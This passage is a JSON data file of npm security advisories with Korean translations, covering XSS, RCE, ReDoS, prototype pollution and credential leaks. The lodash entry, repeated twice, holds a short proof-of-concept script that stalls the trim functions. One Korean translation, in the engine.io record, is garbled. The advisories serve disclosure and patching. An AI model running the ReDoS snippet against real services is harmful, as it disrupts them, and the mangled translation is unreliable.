    "description": "A stored cross-site scripting (XSS) vulnerability in TotalJS allows attackers to execute arbitrary web scripts or HTML via a crafted payload injected into the platform name field in the settings module.",
    "identifiers": "GHSA : GHSA-jj45-24rw-v6jw\nCVE : CVE-2023-30094",
    "severity": "MODERATE",
    "updatedAt": "2023-05-11T14:07:32Z",
    "publishedAt": "2023-05-04T21:30:27Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2023-30094\nhttps://github.com/totaljs/flow/issues/100\nhttps://www.edoardoottavianelli.it/CVE-2023-30094/\nhttps://github.com/totaljs/framework4/commit/e2cea690c3fe4453e94da896a69f832511f65179\nhttps://www.youtube.com/watch?v=8VbTm2sIdBE\nhttps://www.youtube.com/watch?v=vOb9Fyg3iVo\nhttps://github.com/advisories/GHSA-jj45-24rw-v6jw",
    "name": "total4",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 0.0.81",
    "identifier": "0.0.81",
    "descriptionKR": "TotalJS의 저장된 XSS(교차 사이트 스크립팅) 취약성으로 인해 공격자는 설정 모듈의 플랫폼 이름 필드에 삽입된 제작된 페이로드를 통해 임의의 웹 스크립트 또는 HTML을 실행할 수 있습니다."
  },
  {
    "description": "### Impact\n\nDue to a lack of validation when filtering on the public API endpoints, it is possible to reveal private fields via a brute force attack.\n\nGhost(Pro) has already been patched. We can find no evidence that the issue was exploited on Ghost(Pro) prior to the patch being added.\n\nSelf-hosters are impacted if running Ghost a version below v5.46.1. Immediate action should be taken to secure your site - see patches and workarounds below.\n\n### Patches\n\nv5.46.1 contains a fix for this issue.\n\n### Workarounds\n\nAdd a block for requests to `/ghost/api/content/*` where the `filter` query parameter contains `password` or `email`.\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n* Email us at [security@ghost.org](mailto:security@ghost.org)",
    "identifiers": "GHSA : GHSA-r97q-ghch-82j9\nCVE : CVE-2023-31133",
    "severity": "HIGH",
    "updatedAt": "2023-05-09T16:25:26Z",
    "publishedAt": "2023-05-03T21:57:10Z",
    "references": "https://github.com/TryGhost/Ghost/security/advisories/GHSA-r97q-ghch-82j9\nhttps://github.com/TryGhost/Ghost/commit/b3caf16005289cc9909488391b4a26f3f4a66a90\nhttps://github.com/TryGhost/Ghost/releases/tag/v5.46.1\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-31133\nhttps://github.com/advisories/GHSA-r97q-ghch-82j9",
    "name": "ghost",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 5.46.1",
    "identifier": "5.46.1",
    "descriptionKR": "### 영향\n\n공개 API 끝점에서 필터링할 때 검증이 부족하기 때문에 무차별 암호 대입 공격을 통해 개인 필드를 공개할 수 있습니다.\n\nGhost(Pro)는 이미 패치되었습니다. 패치가 추가되기 전에 Ghost(Pro)에서 문제가 악용되었다는 증거를 찾을 수 없습니다.\n\nv5.46.1 이하 버전의 Ghost를 실행하는 경우 자체 호스팅 사용자가 영향을 받습니다. 사이트 보안을 위해 즉각적인 조치를 취해야 합니다. 아래의 패치 및 해결 방법을 참조하세요.\n\n### 패치\n\nv5.46.1에는 이 문제에 대한 수정 사항이 포함되어 있습니다.\n\n### 해결 방법\n\n`filter` 쿼리 매개변수에 `password` 또는 `email`이 포함된 `/ghost/api/content/*`에 대한 요청 블록을 추가합니다.\n\n### 자세한 내용은\n\n이 권고에 대한 질문이나 의견이 있는 경우:\n\n* [security@ghost.org](mailto:security@ghost.org)로 이메일을 보내주세요."
  },
  {
    "description": "### Impact\n\nA specially crafted HTTP request can trigger an uncaught exception on the Engine.IO server, thus killing the Node.js process.\n\n```\nTypeError: Cannot read properties of undefined (reading 'handlesUpgrades')\n    at Server.onWebSocket (build/server.js:515:67)\n```\n\nThis impacts all the users of the [`engine.io`](https://www.npmjs.com/package/engine.io) package, including those who uses depending packages like [`socket.io`](https://www.npmjs.com/package/socket.io).\n\n### Patches\n\nA fix has been released today (2023/05/02): [6.4.2](https://github.com/socketio/engine.io/releases/tag/6.4.2)\n\nThis bug was introduced in version 5.1.0 and included in version 4.1.0 of the `socket.io` parent package. Older versions are not impacted.\n\nFor `socket.io` users:\n\n| Version range               | `engine.io` version | Needs minor update?                                                                                    |\n|-----------------------------|---------------------|--------------------------------------------------------------------------------------------------------|\n| `socket.io@4.6.x`           | `~6.4.0`            | `npm audit fix` should be sufficient                                                                   |\n| `socket.io@4.5.x`           | `~6.2.0`            | Please upgrade to `socket.io@4.6.x`                                                                    |\n| `socket.io@4.4.x`           | `~6.1.0`            | Please upgrade to `socket.io@4.6.x`                                                                    |\n| `socket.io@4.3.x`           | `~6.0.0`            | Please upgrade to `socket.io@4.6.x`                                                                    |\n| `socket.io@4.2.x`           | `~5.2.0`            | Please upgrade to `socket.io@4.6.x`                                                                    |\n| `socket.io@4.1.x`           | `~5.1.1`            | Please upgrade to `socket.io@4.6.x`                                                                    |\n| `socket.io@4.0.x`           | `~5.0.0`            | Not impacted |\n| `socket.io@3.1.x`           | `~4.1.0`            | Not impacted |\n| `socket.io@3.0.x`           | `~4.0.0`            | Not impacted |\n| `socket.io@2.5.0`           | `~3.6.0`            | Not impacted |\n| `socket.io@2.4.x` and below | `~3.5.0`            | Not impacted |\n\n### Workarounds\n\nThere is no known workaround except upgrading to a safe version.\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n* Open an issue in [`engine.io`](https://github.com/socketio/engine.io)\n\nThanks to Thomas Rinsma from Codean for the responsible disclosure.\n",
    "identifiers": "GHSA : GHSA-q9mw-68c2-j6m5\nCVE : CVE-2023-31125",
    "severity": "MODERATE",
    "updatedAt": "2023-06-22T17:25:09Z",
    "publishedAt": "2023-05-03T21:56:51Z",
    "references": "https://github.com/socketio/engine.io/security/advisories/GHSA-q9mw-68c2-j6m5\nhttps://github.com/socketio/engine.io/commit/fc480b4f305e16fe5972cf337d055e598372dc44\nhttps://github.com/socketio/engine.io/releases/tag/6.4.2\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-31125\nhttps://security.netapp.com/advisory/ntap-20230622-0002/\nhttps://github.com/advisories/GHSA-q9mw-68c2-j6m5",
    "name": "engine.io",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 5.1.0, < 6.4.2",
    "identifier": "6.4.2",
    "descriptionKR": "### 영향\n\n특별히 제작된 HTTP 요청은 Engine.IO 서버에서 포착되지 않은 예외를 트리거하여 Node.js 프로세스를 중단시킬 수 있습니다.\n\n```\nTypeError: 정의되지 않은 속성을 읽을 수 없습니다('handlesUpgrades' 읽기).\n    Server.onWebSocket에서(build/server.js:515:67)\n```\n\n이는 [`socket.io`](https: //www.npmjs.com/package/socket.io).\n\n### 패치\n\n수정 사항이 오늘(2023/05/02) 릴리스되었습니다: [6.4.2](https://github.com/socketio/engine.io/releases/tag/6.4.2)\n\n이 버그는 버전 5.1.0에서 도입되었으며 `socket.io` 상위 패키지의 버전 4.1.0에 포함되었습니다. 이전 버전은 영향을 받지 않습니다.\n\n`socket.io` 사용자의 경우:\n\n| 버전 범위 | `engine.io` 버전 | 사소한 업데이트가 필요하십니까? |\n|--------------------------------------------|---- --|----------------------------------------------- -------------------------------------------------- -------|\n| `socket.io@4.6.x` | `~6.4.0` | `npm 감사 수정`으로 충분해야 합니다 |\n| `socket.io@4.5.x` | `~6.2.0` | `socket.io@4.6.x`로 업그레이드하십시오 |\n| `socket.io@4.4.x` | `~6.1.0` | `socket.io@4.6.x`로 업그레이드하십시오 |\n| `socket.io@4.3.x` | `~6.0.0` | `socket.io@4.6.x`로 업그레이드하십시오 |\n| `socket.io@4.2.x` | `~5.2.0` | `socket.io@4.6.x`로 업그레이드하십시오 |\n| `socket.io@4.1.x` | `~5.1.1` | `socket.io@4.6.x`로 업그레이드하십시오 |\n| `socket.io@4.0.x` | `~5.0.0` | 영향을 받지 않음 |\n| `socket.io@3.1.x` | `~4.1.0` | 영향을 받지 않음 |\n| `socket.io@3.0.x` | `~4.0.0` | 영향을 받지 않음 |\n| `socket.io@2.5.0` | `~3.6.0` | 영향을 받지 않음 |\n| `socket.io@2.4.x` 이하 | `~3.5.0` | 영향을 받지 않음 |\n\n### 해결 방법\n\n안전한 버전으로 업그레이드하는 것 외에는 알려진 해결 방법이 없습니다.\n\n### 자세한 내용은\n\n이 권고에 대한 질문이나 의견이 있는 경우:\n\n* [`engine.io`](https://github.com/socketio/engine.io)에서 이슈 열기\n\n책임감 있는 공개에 대해 Codean의 Thomas Rinsma에게 감사드립니다."
  },
  {
    "description": "appium-desktop v1.14.1 and prior is vulnerable to OS Command Injection.",
    "identifiers": "GHSA : GHSA-xq6j-x8pq-g3gr\nCVE : CVE-2023-2479",
    "severity": "CRITICAL",
    "updatedAt": "2023-05-02T19:56:51Z",
    "publishedAt": "2023-05-02T15:30:34Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2023-2479\nhttps://github.com/appium/appium-desktop/commit/12a988aa08b9822e97056a09486c9bebb3aad8fe\nhttps://huntr.dev/bounties/fbdeec3c-d197-4a68-a547-7f93fb9594b4\nhttps://github.com/advisories/GHSA-xq6j-x8pq-g3gr",
    "name": "appium-desktop",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 1.14.1",
    "descriptionKR": "appium-desktop v1.14.1 및 이전 버전은 OS 명령 주입에 취약합니다."
  },
  {
    "description": "### Impact\n\nWhen debug logging is enabled (via `DEBUG` environment variable), the Kubernetes client may log all response bodies into the debug log -- including sensitive data from `Secret` resources.\n\nWhen running in a Kubernetes cluster, this might expose sensitive information to users who are _not_ authorised to access secrets, but have access to Pod logs (either directly using kubectl, or by Pod logs being shipped elsewhere).\n\n### Patches\nUpgrade to 3.5.0 or newer.\n\n### Workarounds\nDisable debug logging entirely, or exclude the `kubernetes:client` debug item (for example, using `DEBUG=*,-kubernetes:client`).\n\n### References\n\n- https://cwe.mitre.org/data/definitions/532.html\n",
    "identifiers": "GHSA : GHSA-g35x-j6jj-8g7j",
    "severity": "MODERATE",
    "updatedAt": "2023-05-02T16:51:26Z",
    "publishedAt": "2023-05-02T16:51:25Z",
    "references": "https://github.com/mittwald/node-kubernetes/security/advisories/GHSA-g35x-j6jj-8g7j\nhttps://github.com/mittwald/node-kubernetes/commit/04f6809fd438417c343d541e57f76f0040e069cd\nhttps://github.com/mittwald/node-kubernetes/releases/tag/v3.5.0\nhttps://github.com/advisories/GHSA-g35x-j6jj-8g7j",
    "name": "@mittwald/kubernetes",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 3.5.0",
    "identifier": "3.5.0",
    "descriptionKR": "### 영향\n\n디버그 로깅이 활성화되면('DEBUG' 환경 변수를 통해) Kubernetes 클라이언트는 '비밀' 리소스의 민감한 데이터를 포함하여 모든 응답 본문을 디버그 로그에 기록할 수 있습니다.\n\nKubernetes 클러스터에서 실행할 때 이것은 비밀에 액세스할 권한이 _없지만_ Pod 로그에 액세스할 수 있는(kubectl을 사용하여 직접 또는 다른 곳에서 전달되는 Pod 로그를 통해) 사용자에게 민감한 정보를 노출할 수 있습니다.\n\n### 패치\n3.5.0 이상으로 업그레이드하십시오.\n\n### 해결 방법\n디버그 로깅을 완전히 비활성화하거나 `kubernetes:client` 디버그 항목을 제외합니다(예: `DEBUG=*,-kubernetes:client` 사용).\n\n### 참조\n\n- https://cwe.mitre.org/data/definitions/532.html"
  },
  {
    "description": "Cross Site Scripting (XSS) vulnerability in pandao editor.md thru 1.5.0 allows attackers to inject arbitrary web script or HTML via crafted markdown text.",
    "identifiers": "GHSA : GHSA-847g-34c5-vvm8\nCVE : CVE-2023-29641",
    "severity": "MODERATE",
    "updatedAt": "2023-05-09T16:51:22Z",
    "publishedAt": "2023-05-01T18:30:23Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2023-29641\nhttps://github.com/pandao/editor.md/issues/985\nhttps://github.com/advisories/GHSA-847g-34c5-vvm8",
    "name": "editor.md",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 1.5.0",
    "descriptionKR": "Pandao editor.md ~ 1.5.0의 XSS(Cross Site Scripting) 취약점으로 인해 공격자가 조작된 마크다운 텍스트를 통해 임의의 웹 스크립트 또는 HTML을 주입할 수 있습니다."
  },
  {
    "description": "All versions of package lodash prior to 4.17.21 are vulnerable to Regular Expression Denial of Service (ReDoS) via the toNumber, trim and trimEnd functions. Steps to reproduce (provided by reporter Liyuan Chen): var lo = require('lodash'); function build_blank (n) { var ret = \"1\" for (var i = 0; i < n; i++) { ret += \" \" } return ret + \"1\"; } var s = build_blank(50000) var time0 = Date.now(); lo.trim(s) var time_cost0 = Date.now() - time0; console.log(\"time_cost0: \" + time_cost0) var time1 = Date.now(); lo.toNumber(s) var time_cost1 = Date.now() - time1; console.log(\"time_cost1: \" + time_cost1) var time2 = Date.now(); lo.trimEnd(s) var time_cost2 = Date.now() - time2; console.log(\"time_cost2: \" + time_cost2)",
    "identifiers": "GHSA : GHSA-29mw-wpgm-hmr9\nCVE : CVE-2020-28500",
    "severity": "MODERATE",
    "updatedAt": "2023-05-01T20:20:44Z",
    "publishedAt": "2022-01-06T20:30:46Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2020-28500\nhttps://github.com/lodash/lodash/pull/5065\nhttps://github.com/lodash/lodash/pull/5065/commits/02906b8191d3c100c193fe6f7b27d1c40f200bb7\nhttps://github.com/lodash/lodash/blob/npm/trimEnd.js%23L8\nhttps://security.netapp.com/advisory/ntap-20210312-0006/\nhttps://snyk.io/vuln/SNYK-JS-LODASH-1018905\nhttps://snyk.io/vuln/SNYK-JAVA-ORGFUJIONWEBJARS-1074896\nhttps://snyk.io/vuln/SNYK-JAVA-ORGWEBJARS-1074894\nhttps://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSBOWER-1074892\nhttps://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSBOWERGITHUBLODASH-1074895\nhttps://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-1074893\nhttps://www.oracle.com//security-alerts/cpujul2021.html\nhttps://www.oracle.com/security-alerts/cpuoct2021.html\nhttps://www.oracle.com/security-alerts/cpujan2022.html\nhttps://www.oracle.com/security-alerts/cpujul2022.html\nhttps://cert-portal.siemens.com/productcert/pdf/ssa-637483.pdf\nhttps://github.com/advisories/GHSA-29mw-wpgm-hmr9",
    "name": "lodash.trim",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 4.17.21",
    "identifier": "4.17.21",
    "descriptionKR": "4.17.21 이전의 모든 버전의 lodash 패키지는 toNumber, trim 및 trimEnd 기능을 통한 정규식 서비스 거부(ReDoS)에 취약합니다. 재현 단계(Liyuan Chen 기자 제공): var lo = require('lodash'); function build_blank (n) { var ret = \"1\" for (var i = 0; i < n; i++) { ret += \" \" } return ret + \"1\"; } var s = build_blank(50000) var time0 = Date.now(); lo.trim(s) var time_cost0 = Date.now() - time0; console.log(\"time_cost0: \" + time_cost0) var time1 = Date.now(); lo.toNumber(s) var time_cost1 = Date.now() - time1; console.log(\"time_cost1: \" + time_cost1) var time2 = Date.now(); lo.trimEnd(s) var time_cost2 = Date.now() - time2; console.log(\"time_cost2: \" + time_cost2)"
  },
  {
    "description": "All versions of package lodash prior to 4.17.21 are vulnerable to Regular Expression Denial of Service (ReDoS) via the toNumber, trim and trimEnd functions. Steps to reproduce (provided by reporter Liyuan Chen): var lo = require('lodash'); function build_blank (n) { var ret = \"1\" for (var i = 0; i < n; i++) { ret += \" \" } return ret + \"1\"; } var s = build_blank(50000) var time0 = Date.now(); lo.trim(s) var time_cost0 = Date.now() - time0; console.log(\"time_cost0: \" + time_cost0) var time1 = Date.now(); lo.toNumber(s) var time_cost1 = Date.now() - time1; console.log(\"time_cost1: \" + time_cost1) var time2 = Date.now(); lo.trimEnd(s) var time_cost2 = Date.now() - time2; console.log(\"time_cost2: \" + time_cost2)",
    "identifiers": "GHSA : GHSA-29mw-wpgm-hmr9\nCVE : CVE-2020-28500",
    "severity": "MODERATE",
    "updatedAt": "2023-05-01T20:20:44Z",
    "publishedAt": "2022-01-06T20:30:46Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2020-28500\nhttps://github.com/lodash/lodash/pull/5065\nhttps://github.com/lodash/lodash/pull/5065/commits/02906b8191d3c100c193fe6f7b27d1c40f200bb7\nhttps://github.com/lodash/lodash/blob/npm/trimEnd.js%23L8\nhttps://security.netapp.com/advisory/ntap-20210312-0006/\nhttps://snyk.io/vuln/SNYK-JS-LODASH-1018905\nhttps://snyk.io/vuln/SNYK-JAVA-ORGFUJIONWEBJARS-1074896\nhttps://snyk.io/vuln/SNYK-JAVA-ORGWEBJARS-1074894\nhttps://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSBOWER-1074892\nhttps://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSBOWERGITHUBLODASH-1074895\nhttps://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-1074893\nhttps://www.oracle.com//security-alerts/cpujul2021.html\nhttps://www.oracle.com/security-alerts/cpuoct2021.html\nhttps://www.oracle.com/security-alerts/cpujan2022.html\nhttps://www.oracle.com/security-alerts/cpujul2022.html\nhttps://cert-portal.siemens.com/productcert/pdf/ssa-637483.pdf\nhttps://github.com/advisories/GHSA-29mw-wpgm-hmr9",
    "name": "lodash.trimend",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 4.17.21",
    "identifier": "4.17.21",
    "descriptionKR": "4.17.21 이전의 모든 버전의 lodash 패키지는 toNumber, trim 및 trimEnd 기능을 통한 정규식 서비스 거부(ReDoS)에 취약합니다. 재현 단계(Liyuan Chen 기자 제공): var lo = require('lodash'); function build_blank (n) { var ret = \"1\" for (var i = 0; i < n; i++) { ret += \" \" } return ret + \"1\"; } var s = build_blank(50000) var time0 = Date.now(); lo.trim(s) var time_cost0 = Date.now() - time0; console.log(\"time_cost0: \" + time_cost0) var time1 = Date.now(); lo.toNumber(s) var time_cost1 = Date.now() - time1; console.log(\"time_cost1: \" + time_cost1) var time2 = Date.now(); lo.trimEnd(s) var time_cost2 = Date.now() - time2; console.log(\"time_cost2: \" + time_cost2)"
  },
  {
    "description": "### Impact\n\nPossible prototype pollution for the `MetadataRecord`, when merged with a base class' metadata object, in `meta` decorator from the `@aedart/support` package.\n\nThe likelihood is questionable, given that a class' metadata can only be set or altered when the class is decorated via `meta()`. Furthermore, object(s) of sensitive nature would have to be stored as metadata, before this can become a vulnerability.\n### Patches\n\nHas been patched in version `0.6.1`.\n",
    "identifiers": "GHSA : GHSA-wwxh-74fx-33c6\nCVE : CVE-2023-30857",
    "severity": "LOW",
    "updatedAt": "2023-05-01T14:01:03Z",
    "publishedAt": "2023-05-01T14:01:02Z",
    "references": "https://github.com/aedart/ion/security/advisories/GHSA-wwxh-74fx-33c6\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-30857\nhttps://github.com/aedart/ion/commit/c3e2ee08710d4164d796ecb66ed291335dae9291\nhttps://github.com/advisories/GHSA-wwxh-74fx-33c6",
    "name": "@aedart/support",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 0.6.1",
    "identifier": "0.6.1",
    "descriptionKR": "### 영향\n\n`@aedart/support` 패키지의 `meta` 데코레이터에서 기본 클래스의 메타데이터 개체와 병합될 때 `MetadataRecord`에 대한 가능한 프로토타입 오염.\n\n클래스의 메타데이터는 클래스가 `meta()`를 통해 데코레이트될 때만 설정되거나 변경될 수 있다는 점에서 그 가능성은 의심스럽습니다. 또한 민감한 성격의 개체는 메타데이터로 저장해야 취약점이 될 수 있습니다.\n### 패치\n\n버전 `0.6.1`에서 패치되었습니다."
  },
  {
    "description": "### Impact\nUsers of typed-rest-client library version 1.7.3 or lower are vulnerable to leak authentication data to 3rd parties. \n\nThe flow of the vulnerability is as follows:\n\n1. Send any request with `BasicCredentialHandler`, `BearerCredentialHandler` or `PersonalAccessTokenCredentialHandler` \n2. The target host may return a redirection (3xx), with a link to a second host.\n3. The next request will use the credentials to authenticate with the second host, by setting the `Authorization` header.\n\nThe expected behavior is that the next request will *NOT* set the `Authorization` header.\n\n\n### Patches\nThe problem was fixed on April 1st 2020.\n\n\n### Workarounds\nThere is no workaround.\n\n### References\nThis is similar to the following issues in nature:\n1. [HTTP authentication leak in redirects](https://curl.haxx.se/docs/CVE-2018-1000007.html) - I used the same solution as CURL did.\n2. [CVE-2018-1000007](https://nvd.nist.gov/vuln/detail/CVE-2018-1000007).",
    "identifiers": "GHSA : GHSA-558p-m34m-vpmq\nCVE : CVE-2023-30846",
    "severity": "CRITICAL",
    "updatedAt": "2023-06-06T17:10:15Z",
    "publishedAt": "2023-04-27T14:02:11Z",
    "references": "https://github.com/microsoft/typed-rest-client/security/advisories/GHSA-558p-m34m-vpmq\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-30846\nhttps://github.com/microsoft/typed-rest-client/pull/207\nhttps://github.com/microsoft/typed-rest-client/commit/f9ff755631b982ee1303dfc3e3c823d0d31233e8\nhttps://security.netapp.com/advisory/ntap-20230601-0008/\nhttps://github.com/advisories/GHSA-558p-m34m-vpmq",
    "name": "typed-rest-client",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.8.0",
    "identifier": "1.8.0",
    "descriptionKR": "### 영향\ntyped-rest-client 라이브러리 버전 1.7.3 이하 사용자는 타사에 인증 데이터를 유출할 수 있습니다.\n\n취약점의 흐름은 다음과 같습니다.\n\n1. `BasicCredentialHandler`, `BearerCredentialHandler` 또는 `PersonalAccessTokenCredentialHandler`로 요청을 보냅니다.\n2. 대상 호스트는 두 번째 호스트에 대한 링크와 함께 리디렉션(3xx)을 반환할 수 있습니다.\n3. 다음 요청은 자격 증명을 사용하여 `Authorization` 헤더를 설정하여 두 번째 호스트를 인증합니다.\n\n예상되는 동작은 다음 요청이 `Authorization` 헤더를 설정하지 *않을* 것입니다.\n\n\n### 패치\n이 문제는 2020년 4월 1일에 수정되었습니다.\n\n\n### 해결 방법\n해결 방법이 없습니다.\n\n### 참조\n이는 본질적으로 다음과 같은 문제와 유사합니다.\n1. [리디렉션에서 HTTP 인증 유출](https://curl.haxx.se/docs/CVE-2018-1000007.html) - CURL과 동일한 솔루션을 사용했습니다.\n2. [CVE-2018-1000007](https://nvd.nist.gov/vuln/detail/CVE-2018-1000007)."
  },
  {
    "description": "### Details\n\nIf a user has access to documents that contain hidden fields or fields they do not have access to, the user could reverse-engineer those values via brute force.\n\nAffected versions:  < 1.7.0\n\n### Workarounds\n\nIf you are unable to update, you can write a `beforeOperation` hook to remove `where` queries that attempt to access hidden field data.\n\n### Detecting Compromise\n\nMonitor your instance for brute-force style requests against your instance using `where` queries.\n",
    "identifiers": "GHSA : GHSA-35jj-vqcf-f2jf\nCVE : CVE-2023-30843",
    "severity": "HIGH",
    "updatedAt": "2023-04-26T22:13:04Z",
    "publishedAt": "2023-04-26T19:45:04Z",
    "references": "https://github.com/payloadcms/payload/security/advisories/GHSA-35jj-vqcf-f2jf\nhttps://github.com/payloadcms/payload/releases/tag/v1.7.0\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-30843\nhttps://github.com/advisories/GHSA-35jj-vqcf-f2jf",
    "name": "payload",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.7.0",
    "identifier": "1.7.0",
    "descriptionKR": "### 세부 정보\n\n사용자가 숨겨진 필드 또는 액세스할 수 없는 필드가 포함된 문서에 액세스할 수 있는 경우 사용자는 무차별 대입을 통해 해당 값을 리버스 엔지니어링할 수 있습니다.\n\n영향을 받는 버전: < 1.7.0\n\n### 해결 방법\n\n업데이트할 수 없는 경우 'beforeOperation' 후크를 작성하여 숨겨진 필드 데이터에 액세스하려는 'where' 쿼리를 제거할 수 있습니다.\n\n### 침해 감지\n\n`where` 쿼리를 사용하여 인스턴스에 대해 무차별 대입 스타일 요청이 있는지 인스턴스를 모니터링합니다."
  },
  {
    "description": "Uncaught Exception in GitHub repository eemeli/yaml starting at version 2.0.0-5 and prior to 2.2.2.",
    "identifiers": "GHSA : GHSA-f9xv-q969-pqx4\nCVE : CVE-2023-2251",
    "severity": "HIGH",
    "updatedAt": "2023-05-03T18:36:54Z",
    "publishedAt": "2023-04-24T15:30:34Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2023-2251\nhttps://github.com/eemeli/yaml/commit/984f5781ffd807e58cad3b5c8da1f940dab75fba\nhttps://huntr.dev/bounties/4b494e99-5a3e-40d9-8678-277f3060e96c\nhttps://github.com/advisories/GHSA-f9xv-q969-pqx4",
    "name": "yaml",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 2.0.0-5, < 2.2.2",
    "identifier": "2.2.2",
    "descriptionKR": "버전 2.0.0-5 및 2.2.2 이전 버전부터 GitHub 리포지토리 eemeli/yaml의 포착되지 않은 예외."
  },
  {
    "description": "### Impact\nPlain text messages containing HTML tags are rendered as HTML in the search results. To exploit this, an attacker needs to trick a user into searching for a specific message containing an HTML injection payload. No cross-site scripting attack is possible due to the hardcoded content security policy.\n\n### Patches\nVersion 3.71.0 of the SDK fixes the issue.\n\n### Workarounds\nRestarting the client will clear the HTML injection.\n",
    "identifiers": "GHSA : GHSA-xv83-x443-7rmw\nCVE : CVE-2023-30609",
    "severity": "MODERATE",
    "updatedAt": "2023-05-10T00:41:30Z",
    "publishedAt": "2023-04-25T19:48:11Z",
    "references": "https://github.com/matrix-org/matrix-react-sdk/security/advisories/GHSA-xv83-x443-7rmw\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-30609\nhttps://github.com/matrix-org/matrix-react-sdk/commit/bf182bc94556849d7acdfa0e5fdea2aa129ea826\nhttps://github.com/matrix-org/matrix-react-sdk/releases/tag/v3.71.0\nhttps://github.com/advisories/GHSA-xv83-x443-7rmw",
    "name": "matrix-react-sdk",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 3.71.0",
    "identifier": "3.71.0",
    "descriptionKR": "### 영향\nHTML 태그가 포함된 일반 텍스트 메시지는 검색 결과에서 HTML로 렌더링됩니다. 이를 악용하기 위해 공격자는 HTML 인젝션 페이로드가 포함된 특정 메시지를 검색하도록 사용자를 속여야 합니다. 하드코딩된 콘텐츠 보안 정책으로 인해 교차 사이트 스크립팅 공격이 불가능합니다.\n\n### 패치\nSDK의 버전 3.71.0은 문제를 해결합니다.\n\n### 해결 방법\n클라이언트를 다시 시작하면 HTML 삽입이 지워집니다."
  },
  {
    "description": "dawnsparks-node-tesseract before 0.4.1 was discovered to contain a remote code execution (RCE) vulnerability via the child_process function.",
    "identifiers": "GHSA : GHSA-88qf-5f3v-pm6m\nCVE : CVE-2023-29566",
    "severity": "CRITICAL",
    "updatedAt": "2023-05-04T19:48:37Z",
    "publishedAt": "2023-04-24T18:30:31Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2023-29566\nhttps://github.com/rona-dinihari/dawnsparks-node-tesseract/commit/81d1664f0b9fe521534acfae1d5b9c40127b36c1\nhttps://github.com/omnitaint/Vulnerability-Reports/blob/ec3645003c7f8996459b5b24c722474adc2d599f/reports/dawnsparks-node-tesseract/report.md\nhttps://github.com/rona-dinihari/dawnsparks-node-tesseract\nhttps://www.npmjs.com/package/dawnsparks-node-tesseract\nhttps://github.com/advisories/GHSA-88qf-5f3v-pm6m",
    "name": "dawnsparks-node-tesseract",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 0.4.1",
    "identifier": "0.4.1",
    "descriptionKR": "0.4.1 이전의 dawnsparks-node-tesseract는 child_process 기능을 통한 RCE(원격 코드 실행) 취약점을 포함하는 것으로 발견되었습니다."
  },
  {
    "description": "broccoli-compass v0.2.4 was discovered to contain a remote code execution (RCE) vulnerability via the child_process function.",
    "identifiers": "GHSA : GHSA-wq8f-xmq3-5vq9\nCVE : CVE-2023-27848",
    "severity": "CRITICAL",
    "updatedAt": "2023-05-03T15:50:53Z",
    "publishedAt": "2023-04-24T18:30:31Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2023-27848\nhttps://github.com/omnitaint/Vulnerability-Reports/blob/9d65add2bca71ed6d6b2e281ee6790a12504ff8e/reports/broccoli-compass/report.md\nhttps://www.npmjs.com/package/broccoli-compass\nhttps://github.com/advisories/GHSA-wq8f-xmq3-5vq9",
    "name": "broccoli-compass",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 0.2.4",
    "descriptionKR": "broccoli-compass v0.2.4는 child_process 기능을 통한 RCE(원격 코드 실행) 취약점을 포함하는 것으로 발견되었습니다."
  },
  {
    "description": "All versions of SheetJS CE through 0.19.2 are vulnerable to \"Prototype Pollution\" when reading specially crafted files. Workflows that do not read arbitrary files (for example, exporting data to spreadsheet files) are unaffected.\n\nA non-vulnerable version cannot be found via npm, as the repository hosted on GitHub and the npm package `xlsx` are no longer maintained.",
    "identifiers": "GHSA : GHSA-4r6h-8v6p-xvw6\nCVE : CVE-2023-30533",
    "severity": "HIGH",
    "updatedAt": "2023-05-23T13:29:07Z",
    "publishedAt": "2023-04-24T09:30:19Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2023-30533\nhttps://cdn.sheetjs.com/advisories/CVE-2023-30533\nhttps://git.sheetjs.com/sheetjs/sheetjs/src/branch/master/CHANGELOG.md\nhttps://git.sheetjs.com/sheetjs/sheetjs/issues/2667\nhttps://github.com/advisories/GHSA-4r6h-8v6p-xvw6",
    "name": "xlsx",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 0.19.3",
    "identifier": "0.19.3",
